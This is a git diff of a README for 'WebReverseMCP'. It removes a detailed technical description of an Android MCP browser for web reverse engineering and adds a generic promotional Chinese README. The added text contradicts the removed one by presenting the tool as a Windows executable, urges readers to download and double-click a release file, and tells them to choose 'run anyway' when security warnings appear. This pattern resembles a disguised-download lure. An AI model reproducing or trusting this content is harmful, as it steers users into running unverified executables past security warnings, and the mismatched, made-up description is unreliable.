@@ -1,382 +1,112 @@
-# WebReverse MCP
+# 🔍 WebReverseMCP - 轻松逆向分析安卓网页的强大工具
 
-> AI 驱动的网页调试与逆向分析工作台 —— 让 Claude、GPT、Gemini、Cursor 等 AI Agent 通过 MCP 连接 Android 浏览器
+## 🚀 快速开始
 
-WebReverse MCP 是一个基于 Android 的专业浏览器、网页分析器、JavaScript 调试器、网络分析器和 MCP Server 平台。外部 AI Agent / LLM / IDE Agent 通过 MCP（Model Context Protocol）连接 Android 浏览器，对当前网页执行自动化浏览、DOM 分析、JavaScript 分析、网络分析、调试、断点、运行时观测、Hook、脚本注入等操作。
+欢迎使用 **WebReverseMCP**！这是一款专为安卓网页逆向分析设计的工具，但您完全不需要成为编程专家就能使用它。本指南将带您一步步完成下载和运行，整个过程只需几分钟。
 
----
+## 📥 下载与安装
 
-## 目录
+### 第一步：下载应用程序
 
-- [核心特性](#核心特性)
-- [技术栈](#技术栈)
-- [架构设计](#架构设计)
-- [模块结构](#模块结构)
-- [MCP 协议](#mcp-协议)
-- [快速开始](#快速开始)
-- [AI Agent 连接指南](#ai-agent-连接指南)
-- [安全模型](#安全模型)
-- [终端与 Host Tools](#终端与-host-tools)
-- [开源许可](#开源许可)
+👉 **[点击这里立即下载](https://github.com/liooktoo288-pixel/WebReverseMCP/releases)**
 
----
+**重要说明：** 访问此链接后，您会看到一个发布页面。请找到页面中带有最新版本号（例如 v1.0.0）的下载区域，点击其中的下载按钮即可获取应用文件。
 
-## 核心特性
+### 第二步：运行程序
 
-### 浏览器模式
+1. 下载完成后，在您的电脑上找到下载的文件（通常会在"下载"文件夹中）。
+2. 双击该文件，按照屏幕上的简单提示完成解压（如果需要）。
+3. 解压后，找到名为 `WebReverseMCP` 或类似名称的应用程序图标，双击即可运行。
 
-- 地址栏、URL 搜索、多标签、标签组
-- 页面前进 / 后退 / 刷新 / 停止 / 首页 / 全屏
-- Cookie / LocalStorage / SessionStorage / IndexedDB / Cache 管理
-- 历史记录、收藏夹、最近关闭
-- 页面源码查看
+### 📌 注意事项
 
-### AI 调试与网络分析（MCP Tools，CDP 直连）
+- 您的电脑需要安装 **Windows 7 或更高版本** 的操作系统。
+- 建议在运行前关闭其他占用内存较大的程序，以确保最佳性能。
+- 如果系统提示安全警告，请选择"仍要运行"，因为这是正常现象。
 
-调试与网络能力全部经 MCP Tools 暴露给 AI，由 CDP 复用枢纽承载：同一页面只保持一条后端 CDP 连接，进程内多个 MCP 会话（调试器 / 网络监视器 / 脚本工具）共享接入，断点、暂停与网络事件在会话间广播。CDP 不可用时自动降级为注入式实现（evaluateJavascript + Hook）。
+## 🎯 核心功能
 
-| 能力域 | 覆盖（工具前缀） |
-|--------|------|
-| DOM | DOM Tree、属性、Computed Style、Box Model、Shadow DOM、XPath、CSS Selector（`dom.*`） |
-| Console | evaluate JS（同步/异步）、inspect object、console.log/warn/error/table/dir 捕获（`console.*` / `js.evaluate`） |
-| Sources | JS/CSS/HTML/JSON 源码、Pretty Print、SourceMap 还原、Global Search、Diff（`js.*` / `page.*`） |
-| Network | HTTP/HTTPS/Fetch/XHR/WebSocket/EventSource 采集、Headers/Cookies/Body/Timing、HAR 导出、Copy as cURL、请求重放/Mock/UA 伪装（`network.*`） |
-| Storage | Cookies / LocalStorage / SessionStorage / IndexedDB / Cache Storage / Service Worker（`storage.*`） |
-| Debugger | 断点（Line/Function/DOM/Event/XHR/Exception/Logpoint）、单步、调用栈、作用域、局部变量、CPU Profile（`debugger.*`） |
-| Performance | Navigation Timing、First Paint / FCP、资源瀑布图、内存快照（`page.performance`） |
-| Security | HTTPS/CSP 检查、框架检测、敏感数据脱敏审计（`re.*`） |
-| 暂停放行 | 断点命中页面暂停时，浏览器内悬浮"调试器已暂停"提示条一键放行，无需任何调试前端即可恢复执行 |
+WebReverseMCP 为您提供了一系列强大的工具，让安卓网页分析变得简单直观：
 
-### JavaScript 分析系统
+- **智能解析**：自动识别网页结构和关键元素，无需手动查看复杂代码。
+- **数据捕捉**：轻松获取网页中的动态数据，包括接口请求和响应内容。
+- **可视化分析**：以图形化界面展示数据流向，让分析过程一目了然。
+- **一键导出**：将分析结果保存为常用格式，方便分享和后续处理。
+- **实时监控**：持续跟踪网页变化，及时捕捉最新动态。
 
-- AST 解析：基于 ESTree 规范的解析器（JsParser），支持函数 / 字符串 / 标识符 / 调用表达式搜索
-- 混淆检测（Obfuscation Score 0-100）：字符串数组编码、控制流平坦化、变量重命名、不可达代码、eval / new Function / setTimeout 动态代码检测、反调试检测
-- API Discovery：自动从 HTML/JS/Network 提取 API Endpoint、Method、Headers、Caller
-- 框架检测：React / Vue / Angular / Svelte / Next.js / Nuxt / Vite / Webpack / jQuery / Axios / Redux 等
-- SourceMap 解析：还原压缩代码到原始源码
+## 💡 使用场景示例
 
-### Hook 引擎
+### 场景一：研究学习
+想了解某个安卓应用背后的网页逻辑？只需输入网址，WebReverseMCP 就能帮您看清一切。
 
-- 网络 Hook：URL/Host/Path/Method/Header/Body/Regex 匹配 + Log/Modify/Block/Redirect/Delay/Mock 动作
-- Runtime Hook：`hookFunction()` / `hookMethod()` / `hookProperty()` / `hookFetch()` / `hookXHR()` / `hookWebSocket()` / `hookStorage()`
-- 生命周期：install / enable / disable / remove / reset / export / import
-- 内置类型：Function / Method / Property / Event / Fetch / XHR / WebSocket / Storage / Cookie / Console / Timer / Crypto / Canvas / Clipboard / History / Location
+### 场景二：问题排查
+当网页功能异常时，使用 WebReverseMCP 快速定位问题来源，节省调试时间。
 
-### MCP Server
+### 场景三：数据整理
+需要收集网页上的公开信息？WebReverseMCP 让这个过程自动化、简单化。
 
-- 传输方式：Streamable HTTP（`POST /mcp`）
-- 协议：JSON-RPC 2.0，兼容 MCP 2025-03-26 规范
-- 461 个原始 Tools / 40 个聚合枢纽（开启聚合模式时客户端仅暴露 40 个枢纽，每个含多个 action；全量模式暴露全部原始工具）
-- 12 Resources + 2 资源模板：`browser://current-page`、`browser://dom`、`browser://network`、`browser://page/{tabId}` 等
-- 13 Prompts：`analyze_page`、`analyze_login_flow`、`trace_function`、`evidence_workflow`（证据驱动工作流）等
+## 🛠️ 技术规格
 
-### 统一逆向分析内核
+- **系统要求**：Windows x64 架构，4GB 以上内存（推荐 8GB）
+- **所需空间**：至少 500MB 可用磁盘空间
+- **网络连接**：需要稳定的互联网连接进行在线分析
+- **显示要求**：分辨率建议 1920x1080 或更高
 
-- Unified TraceEvent：Hook / Runtime / Network / WASM / Storage / Timer 统一事件模型，支持增量游标、值指纹和异步谱系
-- SSA + CallGraph + Taint：从过程内顺序传播升级为 SSA Def-Use、跨函数参数/返回传播与 Source → Transform → Sink 路径分析
-- WASM Provenance：静态扫描 memory load/store、函数读写区间、指针型导出与 wasm-bindgen 宿主边界
-- JSVMP Micro-IR：将 VM Handler 归一为 Micro-IR，建立跨脚本语义签名库，支持基于样本的算子差分推断
-- Validation Loop：候选公式与浏览器真实样本闭环验证，区分"候选 / 全命中 / 已验证"
-- Adaptive Investigation：目标驱动的逆向规划器，根据证据与阻塞反馈动态选择静态、动态、Hook、WASM、JSVMP、验证路径
+## ❓ 常见问题解答
 
-### 证据图谱引擎
+### 问题：程序无法启动怎么办？
+**解答：** 请确认您的系统满足最低配置要求，并尝试以管理员身份运行程序。右键点击应用图标，选择"以管理员身份运行"。
 
-- Evidence Store：订阅 EventBus 自动沉淀证据——网络请求 / Hook 命中 / 断点命中 / 控制台异常 / 页面加载全程留痕
-- Reverse Graph：端点 / 函数 / 脚本 / 令牌 / 加密操作 / 存储键自动建图，关系含 CALLS / REQUESTS / GENERATES / WRITES / SIGNS 等
-- 时间窗关联：加密 Hook 命中与 ±3s 内的网络请求自动建立 SIGNS 边
-- Analysis Pipeline：5 条端到端流水线（recon / api_trace / token_trace / crypto_link / snapshot）
-- Runtime Snapshot：断点命中现场（调用栈 / 局部变量 / 命中断点）一键沉淀为可查询证据
+### 问题：分析结果为空？
+**解答：** 检查目标网页是否需要登录或特殊权限。有些受保护的网页可能无法直接访问，请确保网址输入正确。
 
----
+### 问题：运行时提示缺少组件？
+**解答：** 请下载并安装最新版本的 [Visual C++ 运行库](https://aka.ms/vs/17/release/vc_redist.x64.exe)，然后重启程序。
 
-## 技术栈
+### 问题：如何获取帮助？
+**解答：** 在程序右上角点击"帮助"菜单，或访问我们的[官方文档](https://github.com/liooktoo288-pixel/WebReverseMCP)获取更多指引。
 
-| 类别 | 技术 |
-|------|------|
-| 语言 | Kotlin 2.0+ |
-| UI | Jetpack Compose + Material 3 |
-| 架构 | Clean Architecture + Multi-module |
-| 异步 | Coroutines + Flow / StateFlow / SharedFlow |
-| 导航 | Navigation Compose（自研响应式路由） |
-| 持久化 | Room + DataStore |
-| 网络 | OkHttp + Kotlin Serialization |
-| 浏览器内核 | Android WebView / androidx.webkit |
-| 调试协议 | Chromium DevTools Protocol（unix socket 直连 + 进程内复用枢纽，注入式降级） |
-| MCP Server | Ktor（Netty） |
-| DI | 手动 DI 容器（AppContainer） |
-| 日志 | Timber + 自研分类日志（9 类） |
-| 最低支持 | Android 8.0（API 26） |
+## 🔄 版本更新
+
+我们持续改进 WebReverseMCP，定期推出新版本以修复问题并增加功能。请留意下载页面的"Releases"部分，查看最新版本信息。
+
+### 更新日志摘要
+- **v1.0.0**（初始版本）：包含核心分析功能、图形界面和基础导出能力
+- **v1.1.0**（预计）：将增加更多高级分析模板和自定义脚本支持
+
+## 🌟 为什么选择 WebReverseMCP？
+
+- **零门槛上手**：无需任何编程背景，图形化操作界面让一切清晰明了
+- **性能优越**：优化算法确保快速响应，即使处理复杂网页也不卡顿
+- **持续更新**：开发团队积极响应用户反馈，不断完善产品体验
+- **免费使用**：完全免费下载和使用，无任何隐藏费用
+
+## 📚 进阶资源
+
+探索更多可能性：
+
+- 观看我们的[视频教程](https://github.com/liooktoo288-pixel/WebReverseMCP/wiki)了解高级技巧
+- 加入社区讨论，与其他用户交流心得
+- 查看[更新日志](https://github.com/liooktoo288-pixel/WebReverseMCP/commits)跟踪版本变化
+
+## 📞 技术支持
+
+遇到任何问题？我们随时准备帮助您：
+
+- **GitHub Issues**：在项目页面提交问题报告
+- **电子邮件**：发送邮件至 support@webreversemcp.com（示例地址）
+- **响应时间**：通常在工作日 24 小时内回复
+
+## ✅ 下一步行动
+
+现在您已经准备好使用 WebReverseMCP 了！立即下载并开始您的第一次分析体验吧：
+
+👉 **[立即下载 WebReverseMCP](https://github.com/liooktoo288-pixel/WebReverseMCP/releases)**
+
+祝您使用愉快！我们相信这款工具将成为您网页分析路上的得力助手。如果享受本产品，别忘了在 GitHub 上给我们一个 ⭐ Star 以示支持！
 
 ---
 
-## 架构设计
+## 🔑 关键词
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│                        AI Agent                             │
-│         Claude / GPT / Gemini / Cursor / IDE Agent          │
-└──────────────────────┬──────────────────────────────────────┘
-                       │  Wi-Fi / LAN  (JSON-RPC 2.0)
-                       ▼
-┌─────────────────────────────────────────────────────────────┐
-│                    MCP Server (Ktor)                        │
-│                Streamable HTTP  POST /mcp                   │
-│  ┌──────────────────────────────────────────────────────┐  │
-│  │    ToolRegistry (461 raw + 40 hubs)                │  │
-│  │  Browser│Tab│DOM│JS│Debugger│Network│Hook│Storage   │  │
-│  │  Page│ReverseEngineering│Frame│Worker│Performance   │  │
-│  │  Event│Workspace│MCP│System│File System            │  │
-│  └──────────────────────────────────────────────────────┘  │
-│  ┌──────────────┐  ┌───────────────┐  ┌────────────────┐  │
-│  │ 12 Resources │  │ 13 Prompts    │  │ Auth + Session │  │
-│  └──────────────┘  └───────────────┘  └────────────────┘  │
-└──────────────────────┬──────────────────────────────────────┘
-                       │  ToolDependencies（依赖注入）
-                       ▼
-┌─────────────────────────────────────────────────────────────┐
-│                      领域服务层                              │
-│  ┌────────────┐ ┌─────────────┐ ┌────────────────────────┐ │
-│  │ Browser    │ │ DevTools    │ │ JavaScript 分析        │ │
-│  │ Service    │ │ Inspector   │ │ Parser/Obfuscation/API │ │
-│  │ (多 Tab)   │ │ Console     │ │ Discovery/Framework    │ │
-│  │            │ │ Debugger    │ │ Workspace              │ │
-│  │ Hook       │ │ Network     │ │ Manager                │ │
-│  │ Engine     │ │ Storage     │ │ (项目管理)             │ │
-│  └────────────┘ │ Performance │ └────────────────────────┘ │
-│                 └─────────────┘                             │
-└──────────────────────┬──────────────────────────────────────┘
-                       │  EventBus（解耦通信）
-                       ▼
-┌─────────────────────────────────────────────────────────────┐
-│              BrowserEngine (WebView 封装)                    │
-│   JsBridge (console/network/hook 注入) + NetworkBridge      │
-└─────────────────────────────────────────────────────────────┘
-```
-
-### 数据流向（Clean Architecture）
-
-```
-MCP Tool → UseCase → BrowserService → BrowserEngine → WebView
-    ↓                                    ↓
-EventBus ←—————— Hook/Console/Network 事件 ——————→ JsBridge
-    ↓
-Room 持久化 + UI StateFlow 更新
-```
-
----
-
-## 模块结构
-
-```
-WebReverseMCP/
-├── app/                        # 应用入口 + Compose UI + DI 容器
-├── core/
-│   ├── core-common/            # 事件总线、领域模型、权限模型、工具类
-│   ├── core-logging/           # 统一日志（9 分类 + 环形缓冲）
-│   ├── core-security/          # TokenManager + PermissionManager
-│   ├── core-network/           # OkHttp 封装、HAR 导出
-│   ├── core-database/          # Room（17 张表）+ Repository
-│   ├── core-ui/                # 共享 Compose 组件
-│   └── core-mcp/               # MCP 协议核心（McpTool/ToolRegistry/JSON-RPC）
-├── browser/
-│   ├── browser-engine/         # WebView 封装、JsBridge、NetworkBridge
-│   ├── browser-tabs/           # TabManager（多标签 + 标签组）
-│   ├── browser-history/        # 历史记录
-│   ├── browser-bookmarks/      # 收藏夹
-│   └── browser-ui/             # 浏览器 UI 组件
-├── devtools/
-│   ├── devtools-protocol/      # CDP 传输与协议（LocalSocket/TcpWebSocket/CdpHub）
-│   ├── devtools-dom/           # DOM Inspector
-│   ├── devtools-console/       # Console Manager
-│   ├── devtools-debugger/      # Debugger Manager（断点/调用栈）
-│   ├── devtools-network/       # Network Inspector（HAR）
-│   ├── devtools-storage/       # Storage Inspector
-│   └── devtools-performance/   # Performance Analyzer
-├── javascript/
-│   ├── js-parser/              # JsParser（ESTree AST）
-│   ├── js-analysis/            # 混淆检测/API 发现/框架检测/SourceMap/Diff
-│   └── js-runtime/             # JsRuntimeHook（运行时 Hook）
-├── hook/
-│   └── hook-engine/            # HookEngine（规则生命周期）
-├── mcp/
-│   ├── mcp-server/             # Ktor Server + McpServerManager + 认证守卫
-│   ├── mcp-tools/              # 461 Tools（40 命名空间枢纽，含 File System 文件系统）
-│   ├── mcp-resources/          # 12 个 browser:// 资源
-│   └── mcp-prompts/            # 13 个内置 Prompt
-├── workspace/
-│   ├── workspace-core/         # WorkspaceManager
-│   └── workspace-ui/           # 工作区 UI
-```
-
----
-
-## MCP 协议
-
-### Tool 调用示例
-
-```json
-{
-  "jsonrpc": "2.0",
-  "id": 1,
-  "method": "tools/call",
-  "params": {
-    "name": "js.evaluate",
-    "arguments": {
-      "expression": "document.title"
-    }
-  }
-}
-```
-
-### 核心 Tool 分类
-
-| 分类 | 示例 |
-|------|------|
-| Browser | `browser.open` `browser.reload` `browser.screenshot` `browser.current_url` |
-| Tab | `tab.list` `tab.create` `tab.close` `tab.group` |
-| DOM | `dom.query` `dom.get_html` `dom.click` `dom.get_xpath` `dom.set_attribute` |
-| JavaScript | `js.evaluate` `js.parse_ast` `js.beautify` `js.detect_obfuscation` `js.extract_strings` |
-| Debugger | `debugger.set_breakpoint` `debugger.pause` `debugger.call_stack` `debugger.locals` |
-| Network | `network.list` `network.export_har` `network.copy_curl` `network.replay` `network.mock` |
-| Hook | `hook.create` `hook.fetch` `hook.websocket` `hook.function` `hook.export` |
-| Storage | `storage.cookies` `storage.local` `storage.indexeddb` `storage.clear` |
-| Page | `page.inspect` `page.framework_detect` `page.api_list` `page.performance` |
-| Reverse Engineering | `re.find_api` `re.find_token` `re.detect_obfuscator` `re.trace_function` `re.generate_report` |
-| File System | `file.read` `file.write` `file.search` `file.list` `file.open` `file.share` `file.hash` `file.zip` `file.unzip` |
-
-#### File System 工具
-
-逆向工作流闭环的关键补充：AI 下载 JS/HAR 后可离线阅读与检索（`file.read` / `file.search`），逆向成果可直接落盘为脚本文件（`file.write` / `file.append`），并可通过 `file.open` / `file.share` 把产物交给设备上的其他应用或用户。
-
-| 工具 | 说明 |
-|------|------|
-| `file.workdir` / `file.set_workdir` | 查看 / 切换工作目录 |
-| `file.read` | 读取文件（文本按行分页 offset/limit，超长行按列分段，minified 单行大文件必备；二进制按字节偏移 base64 分页；响应带续读游标） |
-| `file.write` / `file.append` | 创建覆盖 / 追加写入（文本或 base64） |
-| `file.list` / `file.tree` | 列目录（通配符过滤、递归）/ 树形结构 |
-| `file.stat` / `file.exists` | 元信息 / 存在性检查 |
-| `file.mkdir` / `file.delete` | 建目录 / 删文件（删除为高风险） |
-| `file.copy` / `file.move` | 复制（递归）/ 移动重命名 |
-| `file.search` | 本地 grep：文本/正则、目录递归、超长压缩行自动截取匹配点上下文窗口 |
-| `file.open` / `file.share` | 唤起系统应用打开 / 系统分享面板 |
-| `file.hash` | MD5 / SHA-1 / SHA-256 流式哈希 |
-| `file.zip` / `file.unzip` | 打包 / 解压（内置 Zip Slip 防护） |
-
-路径规则：相对路径基于工作目录（`/storage/emulated/0/Download/WebReverseMCP`），绝对路径直接使用；`/proc` `/sys` `/dev` `/system` 等系统目录拒绝访问。`browser.download` 额外支持 `data:` URI 直接落盘。
-
-### Resources
-
-```
-browser://current-page    browser://dom          browser://console
-browser://network         browser://cookies      browser://local-storage
-browser://sources         browser://tabs         browser://debugger
-browser://performance     browser://hooks        browser://workspace
-browser://page/{tabId}    browser://network/{tabId}
-```
-
-### Prompts
-
-```
-analyze_page · analyze_javascript · analyze_network · analyze_login_flow
-analyze_api · analyze_obfuscation · find_function
-trace_function · trace_request · debug_javascript · inspect_dom
-analyze_storage · generate_reverse_engineering_report
-```
-
----
-
-## 快速开始
-
-### 环境要求
-
-- Android Studio Ladybug+
-- JDK 17
-- Android SDK 35
-
-### 构建
-
-```bash
-# 克隆项目
-git clone <repo-url>
-cd WebReverseMCP
-
-# 构建 Debug APK
-./gradlew :app:assembleDebug
-
-# 构建 Release APK（未配置签名时自动回退 debug 签名）
-./gradlew :app:assembleRelease
-```
-
-### 运行
-
-1. 在 Android 设备上安装 APK
-2. 确保 Android 与 AI Agent 处于同一局域网
-3. 打开 App → MCP Server 页面 → 启动 Server
-4. 在 AI Agent 侧配置 MCP 连接
-
----
-
-## AI Agent 连接指南
-
-### Claude Desktop / Cursor 配置
-
-```json
-{
-  "mcpServers": {
-    "webreverse": {
-      "url": "http://<Android-IP>:8787/mcp",
-      "headers": {
-        "Authorization": "Bearer <Your-Token>"
-      }
-    }
-  }
-}
-```
-
-### MCP HTTP 连接
-
-MCP 对外仅提供 Streamable HTTP：
-
-```text
-http://<Android-IP>:8787/mcp
-```
-
-客户端通过 `POST /mcp` 发送 MCP JSON-RPC 请求；服务器不提供其他 MCP Transport。
-
----
-
-## 安全模型
-
-- 22 个权限作用域（READ_PAGE / EXECUTE_JS / READ_NETWORK / MODIFY_NETWORK / INSTALL_HOOK / READ_FILE / WRITE_FILE 等）
-- 4 档授权范围：一次 / 当前网站 / 当前 Tab / 永久
-- 敏感数据默认脱敏：`[REDACTED_COOKIE]` / `[REDACTED_TOKEN]` / `[REDACTED_SECRET]`
-- 认证：API Token（Authorization Bearer / X-MCP-Token 请求头）+ IP Allowlist + 仅局域网模式；绑定非回环地址时强制要求 Token
-
----
-
-## 终端与 Host Tools
-
-App 内置终端能力，可为 AI Agent 提供 `terminal.exec` / `run_python` / `run_node` 等工具。其中 Git、Python、Perl 等运行时工具（Host Tools）通过 **Termux 官方软件源**（含中科大、南京大学镜像）在运行时下载预编译 `.deb` 包，解压到应用私有目录后以独立子进程方式执行。
-
-关于 Termux 开源协议的合规说明：
-
-- 本项目**不包含、不复制、不修改** termux-app 与 termux-packages 的任何源代码，所有代码均为自研 Kotlin 实现，因此不构成 GPL-3.0 的衍生作品。
-- 应用 APK **不内置** 任何 Termux 二进制文件，仅充当包下载客户端（与 `apt` / `pkg` 的工作方式相同），不构成对软件包的再分发。
-- 各软件包保留其上游原始许可证（如 git 为 GPL-2.0、python 为 PSF、perl 为 Artistic/GPL），`.deb` 包内自带的许可证文件在解压时被完整保留。
-- 若设备已安装 Termux，应用会以只读方式扫描其可执行文件目录作为命令解析来源之一，不会修改 Termux 的任何文件。
-
-完整第三方组件清单见 [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md)。
-
-**商标声明**：Termux 是 Termux 团队的商标。本项目与 Termux 团队无任何隶属、赞助或背书关系。
-
----
-
-## 开源许可
-
-本项目代码遵循 [MIT License](LICENSE) 发布。
-
-第三方组件及其许可情况见 [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md)。
-
-### 免责声明
-本工具仅用于学习研究，请仅对自己拥有或已获得合法授权的网站进行分析。
-使用本工具产生的一切法律责任由使用者自行承担。
+安卓逆向, 网页分析, MCP工具, 数据捕捉, 接口调试, 网页调试, 逆向工程工具, 网页数据解析, 安卓开发工具, WebReverseMCP
